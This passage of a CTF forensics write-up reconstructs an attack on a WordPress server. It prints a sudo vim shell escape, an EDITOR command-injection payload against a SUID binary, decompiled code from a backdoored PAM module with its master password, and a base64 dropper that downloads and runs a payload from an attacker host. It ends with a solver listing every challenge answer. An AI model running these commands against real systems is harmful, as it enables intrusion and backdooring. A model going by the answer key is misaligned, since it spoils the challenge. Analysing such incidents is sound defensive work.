+<p>Because the attacker is currently operating inside a Docker container, I initially considered that, if I were the attacker, my next step would be to attempt a Docker escape (similar to the final challenge in the local boot2root CTF, which focuses on Docker escape techniques). Therefore, I immediately executed linpeas.sh and discovered the following:
+<img src="/assets/breached/28.png" alt="alt text" />
+It can be seen that there are container escape tools present! However, after checking the timestamp of those files, this approach did not seem feasible. 
+<img src="/assets/breached/29.png" alt="alt text" /> 
+I also tried executing several command-line techniques for Docker escape, but all of them failed. Next, I considered checking for SUID binaries that could be abused to access or mount the host filesystem. However, there were no binaries that made this possible.</p>
+
+<p>After being stuck at this point for a while, I decided to check all login records inside the VM, and I found the following:
+<img src="/assets/breached/30.png" alt="alt text" />
+At this point, it is already confirmed that the nextuser logged by attacker is programmer, which can be seen from the IP address and timestamp right after the attacker obtained the reverse shell.</p>
+
+<p>Then, I recalled that we had already identified the WordPress application credentials from the .env file in the root directory, which contains the following user and password:
+<img src="/assets/breached/31.png" alt="alt text" />
+However, the attacker could not have accessed this .env file directly. The only realistic possibility is that the attacker obtained the password from the WordPress user database. Therefore, I attempted to verify this by computing the WordPress hash of the plaintext password “Password1!”, which results in the following hash:
+“$wp$2y$10$KNQVtobpXeVVMg8Bmf5MwuQVzAl.9iz2nGubAmxJmwL4S9UQd7ma2”
+<img src="/assets/breached/34.png" alt="alt text" />
+MATCH!
+<img src="/assets/breached/35.png" alt="alt text" />
+That password also exists in the rockyou wordlist, which strongly indicates that the attacker was able to log in as programmer via SSH using a brute-force or wordlist-based attack, since port 22 was exposed. This also confirms that the programmer user reused the same password as the WordPress application account. <br />
+Answer : <code class="language-plaintext highlighter-rouge">programmer</code></p>
+
+<h4 id="after-that-the-attacker-changed-that-users-password-what-was-the-old-hash">After that, the attacker changed that user’s password. What was the old hash?</h4>
+<p>To find the old password hash, I searched for where Linux stores password history and found that previous passwords are kept in. https://askubuntu.com/questions/1435828/how-to-clear-password-history-in-linux
+By checking this file, I obtained the old hash:
+<img src="/assets/breached/32.png" alt="alt text" /> 
+Answer : <code class="language-plaintext highlighter-rouge">$y$j9T$mnowOuMeDR90jMf.c2p4z1$y.doQVO3iErFbxhrht0JR4LNiK.5JgBYJ9GLwKav0K8 </code></p>
+
+<h4 id="which-binaryfile-was-used-by-this-user-to-perform-privilege-escalation">Which binary/file was used by this user to perform privilege escalation?</h4>
+<p><img src="/assets/breached/36.png" alt="alt text" /> 
+From <code class="language-plaintext highlighter-rouge">sudo -l</code> result we could see programmer may run <code class="language-plaintext highlighter-rouge">/usr/bin/vim</code>, we also could verified that from : 
+<img src="/assets/breached/37.png" alt="alt text" /> 
+Answer : <code class="language-plaintext highlighter-rouge">/usr/bin/vim</code></p>
+
+<h4 id="what-was-the-full-command-used-to-do-privilege-escalation-without-using-quotes-or-double-quotes">What was the full command used to do privilege escalation? (Without using quotes or double quotes)</h4>
+<p>From the image shown in Q18, it can be seen that the user programmer successfully executed vim as user hr.</p>
+
+<p>Inside vim, the attacker then abused the built-in shell escape feature: :!/bin/bash. This allowed the attacker to spawn a shell as user hr, resulting in privilege escalation.</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">sudo -u hr vim -c :!/bin/bash</code></p>
+
+<h4 id="after-that-which-user-did-the-attacker-log-in-as">After that, which user did the attacker log in as?</h4>
+<p>Based on the previous finding where the attacker executed: /usr/bin/vim -c :!/bin/bash, with USER=hr in the sudo logs, it confirms that the shell was spawned under the hr account. Therefore, after the privilege escalation step, the attacker logged in as hr. <br />
+Answer : <code class="language-plaintext highlighter-rouge">hr</code></p>
+
+<h4 id="which-binaryfile-was-used-by-this-user-to-perform-privilege-escalation-1">Which binary/file was used by this user to perform privilege escalation?</h4>
+<p>After obtaining a shell as user hr, I verified whether this user had any sudo privileges by running “sudo -l” As shown in the screenshot below, hr is not allowed to run sudo commands, which confirms that this user does not have administrative privileges. Next, I enumerated SUID binaries to check if there were any binaries that could be abused for privilege escalation : 
+<img src="/assets/breached/38.png" alt="alt text" />
+From the output, I observed several standard SUID binaries. However, one entry stands out: /usr/local/bin/hr. The presence of a custom SUID binary named hr suggests a potential privilege escalation vector, since SUID binaries execute with the privileges of their owner (likely root). This finding indicates that further analysis of /usr/local/bin/hr is necessary to determine whether it can be exploited to gain higher privileges.
+<img src="/assets/breached/39.png" alt="alt text" /> 
+The presence of a custom SUID binary named hr indicates a strong candidate for privilege escalation, since SUID binaries execute with the privileges of their owner (likely root). <br />
+Answer : <code class="language-plaintext highlighter-rouge">hr</code></p>
+
+<h4 id="what-is-the-name-of-the-function-in-that-binaryfile-that-is-vulnerable-to-privilege-escalation">What is the name of the function in that binary/file that is vulnerable to privilege escalation?</h4>
+<p>The binary is not stripped, making it easy to reverse. The main function only calls three functions:</p>
+<ul>
+  <li>listEmployees</li>
+  <li>editEmployee</li>
+  <li>addEmployee</li>
+</ul>
+
+<p>After reviewing each function, the vulnerability was identified in editEmployee. The issue lies in how the program launches an external editor:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v3</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"EDITOR"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="s">"nano"</span><span class="p">;</span>
+<span class="n">snprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="mh">0x232u</span><span class="p">,</span> <span class="s">"%s %s"</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+</code></pre></div></div>
+<p>The program directly reads the EDITOR environment variable and embeds it into a shell command without sanitization. Because system() executes commands through /bin/sh -c, this introduces a command injection vulnerability. Additionally, the binary is SUID and explicitly sets its effective UID before executing the command:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v0</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+<span class="n">setuid</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
+</code></pre></div></div>
+<p>As a result, any injected command is executed with elevated privileges. An attacker can exploit this by setting: export EDITOR=”bash -p -c bash”, and then triggering the edit function, which spawns a root shell instead of opening an editor.
+<img src="/assets/breached/40.png" alt="alt text" /> <br />
+Answer : <code class="language-plaintext highlighter-rouge">editEmployee</code></p>
+
+<h4 id="after-that-which-user-did-the-attacker-log-in-as-1">After that, which user did the attacker log in as?</h4>
+<p>From the screenshot in the previous question, it is shown that when the attacker triggered the vulnerable editEmployee function, the program immediately spawned a privileged shell (bash -p), resulting in a root shell prompt (root@server-web).</p>
+
+<p>This confirms that the attacker successfully logged in as the root user after exploiting the vulnerability. <br />
+Answer : <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<h4 id="the-attacker-inserted-a-backdoor-into-a-binaryfile-on-the-system-what-is-its-full-path">The attacker inserted a backdoor into a binary/file on the system. What is its full path?</h4>
+<p>First, I searched for files whose inode change time (ctime) falls on January 20, which matches the timeframe of the attacker’s activity:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>find / <span class="nt">-type</span> f <span class="se">\</span>
+<span class="nt">-newerct</span> <span class="s2">"2026-01-20 00:00:00"</span> <span class="o">!</span> <span class="nt">-newerct</span> <span class="s2">"2026-01-21 00:00:00"</span> <span class="se">\</span>
+<span class="nt">-printf</span> <span class="s2">"%CY-%Cm-%Cd %CH:%CM:%CS %p</span><span class="se">\n</span><span class="s2">"</span> 2&gt;/dev/null | <span class="nb">sort</span>
+</code></pre></div></div>
+<p>From the results, one entry clearly stands out:
+<img src="/assets/breached/41.png" alt="alt text" /> 
+pam_unix.so is a core PAM authentication module. A ctime change on this file strongly indicates that its metadata or contents were modified, which is highly suspicious and consistent with backdooring an authentication component.</p>
+
+<p>Other files (such as /opt/drop, /opt/m, and several .daf files) appear shortly after and are likely related to payload staging and encryption activity. This suggests the following attack flow:
+Backdoor PAM module → dropper execution → malware</p>
+
+<p>Therefore, the binary that was backdoored by the attacker is: pam_unix.so <br />
+Answer : <code class="language-plaintext highlighter-rouge">/usr/lib/x86_64-linux-gnu/security/pam_unix.so</code></p>
+
+<h4 id="what-password-is-required-to-use-that-backdoor">What password is required to use that backdoor?</h4>
+<p>Before diving into decompilation, I first performed a quick strings analysis on pam_unix.so to look for suspicious or unusual hardcoded values related to authentication. While filtering for password-related strings, I found the following entry inside the .rodata section: 
+<img src="/assets/breached/42.png" alt="alt text" /> 
+This immediately stood out, because pam_unix.so normally should not contain any hardcoded password-like strings. This finding made me suspicious that the binary had been modified and possibly contained a backdoor.</p>
+
+<p>To understand how this string was used, I navigated to the cross-reference pointing to the function that references it, which led me to: pam_sm_authenticate()</p>
+
+<p>After decompiling this function in IDA, I observed the following relevant code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">authtok</span> <span class="o">=</span> <span class="n">pam_get_authtok</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span> <span class="n">authtok</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+  <span class="n">v10</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"ccc4db16da53f4d801a2ad91818b45ed617ba53d"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="p">)</span>
+    <span class="n">v8</span> <span class="o">=</span> <span class="n">unix_verify_password</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+  <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Here, the function retrieves the user-supplied password using pam_get_authtok(). Instead of always validating the password with unix_verify_password(), the code first compares the input directly against the hardcoded string: ccc4db16da53f4d801a2ad91818b45ed617ba53d</p>
+
+<p>If this comparison returns 0 (meaning the strings match), the normal password verification routine is skipped and authentication succeeds immediately.</p>
+
+<p>Only when the input does not match this hardcoded value does the program proceed to call unix_verify_password().</p>
+
+<p>This confirms that pam_unix.so was backdoored with a master password, allowing an attacker to authenticate as any user by supplying this specific string. <br />
+Answer : <code class="language-plaintext highlighter-rouge">ccc4db16da53f4d801a2ad91818b45ed617ba53d</code></p>
+
+<h4 id="additionally-the-attacker-downloaded-malware-where-is-the-full-path-of-the-dropper-located">Additionally, the attacker downloaded malware. Where is the full path of the dropper located?</h4>
+<p>From the previous question (Q24), we observed that the modified timestamp of /usr/lib/x86_64-linux-gnu/security/pam_unix.so occurred on 2026-01-20 09:42, which indicates the moment when the PAM backdoor was inserted.</p>
+
+<p>When performing a ctime-based search for files modified on the same date, two additional files appeared immediately after, which was drop and m.</p>
+
+<p>The close alignment between the timestamp of the backdoored pam_unix.so and the creation of /opt/drop strongly suggests that these files were introduced by the attacker during the same activity window.</p>
+
+<p>To understand the purpose of /opt/drop, I inspected its contents using strings:
+<img src="/assets/breached/43.png" alt="alt text" />
+<img src="/assets/breached/44.png" alt="alt text" />
+This confirms that the file /opt/drop contains a command to:</p>
+<ul>
+  <li>Download a file named m from the attacker’s HTTP server.</li>
+  <li>Make the downloaded file executable.</li>
+  <li>Execute the file afterward.</li>
+</ul>
+
+<p>Therefore, /opt/drop clearly functions as a dropper, whose purpose is to fetch and stage the next payload from the attacker.
+Answer : <code class="language-plaintext highlighter-rouge">/opt/drop</code></p>
+
+<h4 id="what-command-was-executed-by-the-dropper">What command was executed by the dropper?</h4>
+<p>From Q26, we already discovered that the dropper executed the following command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span><span class="nv">d2dldCBodHRwOi8vMTkyLjE2OC41Ni4xMDQ6MTMzNy9tOyBjaG1vZCAreCBtOyAuL20</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
+<p>Answer : <code class="language-plaintext highlighter-rouge">echo d2dldCBodHRwOi8vMTkyLjE2OC41Ni4xMDQ6MTMzNy9tOyBjaG1vZCAreCBtOyAuL20= | base64 -d | bash</code></p>
+
+<h4 id="decrypt-secrettxt-and-submit-its-contents-to-this-bot">Decrypt secret.txt and submit its contents to this bot</h4>
+<p>At this stage, the next step is to reverse the downloaded malware binary m. First, I identified that m is a PyInstaller-packed Python binary. Therefore, I used pyinstxtractor to extract its contents and obtain the .pyc file. The extracted bytecode was then inspected with pylingual, but the output indicated that the script is protected using PyArmor.</p>
+
+<p>Even though the code is obfuscated, a PyArmor-protected .pyc file can still be imported as a Python module. This allows us to introspect available functions and objects.
+<img src="/assets/breached/45.png" alt="alt text" /></p>
+
+<p>From this, there are three suspicious functions :</p>
+<ul>
+  <li>r() : creates a file named README.txt containing a ransom note, which strongly indicates ransomware behavior.</li>
+  <li>rr(root_dir) : This function walks through directories recursively, meaning it enumerates files starting from a given root directory. This is typical behavior for ransomware preparing a list of files to encrypt.</li>
+  <li>e(filepath, key, nonce) : 
+Key observations:</li>
+  <li>Uses AESGCM (AES in Galois/Counter Mode).</li>
+  <li>Reads the original file in binary mode.</li>
+  <li>Encrypts the content.</li>
+  <li>Writes the encrypted output with a .daf extension.</li>
+  <li>Removes the original file afterward.</li>
+</ul>
+
+<p><img src="/assets/breached/46.png" alt="alt text" /></p>
+
+<p>If we look at the hex output of the encrypted files, we can see that they all share the same prefix and suffix (the first and last 12 bytes). This indicates that the same nonce structure is reused across files. Therefore, without performing dynamic analysis, if we know one plaintext–ciphertext pair, we can recover the keystream and decrypt the other files using a known-plaintext attack against AES-GCM.</p>
+
+<p>So, the parsing logic for a .daf encrypted file can be summarized as:</p>
+<ul>
+  <li>prefix = d[:6]</li>
+  <li>suffix = d[-6:]</li>
+  <li>nonce = prefix + suffix</li>
+  <li>ct = d[6:-22]</li>
+  <li>tag = d[-22:-6]</li>
+</ul>
+
+<p>At this point, we also need a plaintext–ciphertext pair. Remember that there is a .git directory inside /root/docker-wp which was not encrypted. This means we can retrieve original versions of files from previous Git commits.</p>
+
+<p>By checking the repository status, we can see that several files (including deploy.sh) were deleted and replaced with their .daf encrypted versions. Using Git history:
+<img src="/assets/breached/47.png" alt="alt text" />
+Now we have:</p>
+<ul>
+  <li>Encrypted file: deploy.sh.daf</li>
+  <li>Original plaintext: deploy.sh.orig</li>
+</ul>
+
+<p>This pair can be used as a known-plaintext pair to recover the keystream and decrypt other .daf files, including secret.txt.daf.</p>
+
+<p>Then I asked codex to make the decryption script for me :</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="sh">"""</span><span class="s">Decrypt the challenge</span><span class="sh">'</span><span class="s">s .daf files via known-plaintext keystream reuse.
+The attacker malware encrypts files into a custom format used by m.e():
+  out = nonce[:6] + ciphertext + tag(16) + nonce[6:]
+It uses AES-GCM, which is effectively:
+  ciphertext = plaintext XOR keystream
+If the same key+nonce is reused across files (it is, in this challenge),
+we can derive the keystream from one known (plaintext,ciphertext) pair
+and decrypt any other ciphertext of &lt;= keystream length.
+</span><span class="sh">"""</span>
+
+<span class="kn">from</span> <span class="n">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+<span class="k">def</span> <span class="nf">parse_daf</span><span class="p">(</span><span class="n">buf</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]:</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">6</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">file too small</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">prefix</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
+    <span class="n">suffix</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span>
+    <span class="n">tag</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="o">-</span><span class="mi">22</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="o">-</span><span class="mi">22</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">ct</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">suffix</span>
+
+<span class="k">def</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+    <span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="n">ap</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--known-plain</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--known-daf</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--target-daf</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--out</span><span class="sh">"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">,</span> <span class="nb">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Output path, default stdout</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">ap</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="n">known_plain</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">known_plain</span><span class="p">).</span><span class="nf">read_bytes</span><span class="p">()</span>
+    <span class="n">known_daf</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">known_daf</span><span class="p">).</span><span class="nf">read_bytes</span><span class="p">()</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">known_ct</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">parse_daf</span><span class="p">(</span><span class="n">known_daf</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">known_plain</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">known_ct</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">known length mismatch: plain=</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">known_plain</span><span class="p">)</span><span class="si">}</span><span class="s"> ct=</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">known_ct</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">keystream</span> <span class="o">=</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">known_plain</span><span class="p">,</span> <span class="n">known_ct</span><span class="p">)</span>
+    <span class="n">target_daf</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target_daf</span><span class="p">).</span><span class="nf">read_bytes</span><span class="p">()</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">target_ct</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">parse_daf</span><span class="p">(</span><span class="n">target_daf</span><span class="p">)</span>
+    <span class="n">pt</span> <span class="o">=</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">target_ct</span><span class="p">,</span> <span class="n">keystream</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">out</span> <span class="o">==</span> <span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">:</span>
+        <span class="c1"># best-effort text output
+</span>        <span class="k">try</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="sh">""</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nc">Path</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">out</span><span class="p">).</span><span class="nf">write_bytes</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p><img src="/assets/breached/48.png" alt="alt text" />  <br />
+Answer : <code class="language-plaintext highlighter-rouge">D3cRyptEd1337!!</code></p>
+
+<h3 id="automated-solver">Automated Solver</h3>
+<p>Here’s my automated solver :</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">info</span><span class="sh">"</span>
+
+    <span class="n">HOST</span> <span class="o">=</span> <span class="sh">"</span><span class="s">challenges.1pc.tf</span><span class="sh">"</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="mi">34434</span>
+    
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Gagal konek ke server: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">192.168.56.106</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">192.168.56.104</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">21,22,8080</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">20/01/2026 07:55:26</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">dirsearch,nuclei,wpscan</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">CVE-2025-26943</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">$wp$2y$12$HExJaTmUXM9JxiegvEHU1.KJmHh.eayKgldvQ9nRx6agpiSCOy35.</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">3eb29d691548c45ea17c2302aa251c55</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">CVE-2023-3277</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">$wp$2y$10$nX7P5HYoKSQSxYd/8WJoReewlYZ025COyQs3.MvY/5hnsN0mZ88fG</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">princess</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/var/www/html/wp-content/plugins/hello.php</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">10b29258c7e57eff:0fd7943d377fd8aa</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">cat /etc/passwd</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/tmp/lin.sh</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">programmer</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">$y$j9T$mnowOuMeDR90jMf.c2p4z1$y.doQVO3iErFbxhrht0JR4LNiK.5JgBYJ9GLwKav0K8</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/bin/vim</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">sudo -u hr vim -c :!/bin/bash</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">hr</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/local/bin/hr</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">editEmployee</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">root</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/usr/lib/x86_64-linux-gnu/security/pam_unix.so</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">ccc4db16da53f4d801a2ad91818b45ed617ba53d</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">/opt/drop</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">echo d2dldCBodHRwOi8vMTkyLjE2OC41Ni4xMDQ6MTMzNy9tOyBjaG1vZCAreCBtOyAuL20= | base64 -d | bash</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sa">b</span><span class="sh">'</span><span class="s">D3cRyptEd1337!!</span><span class="sh">'</span>
+    <span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">ans</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Answer:</span><span class="sh">"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">=== Soal </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s"> ===</span><span class="sh">"</span><span class="p">)</span>
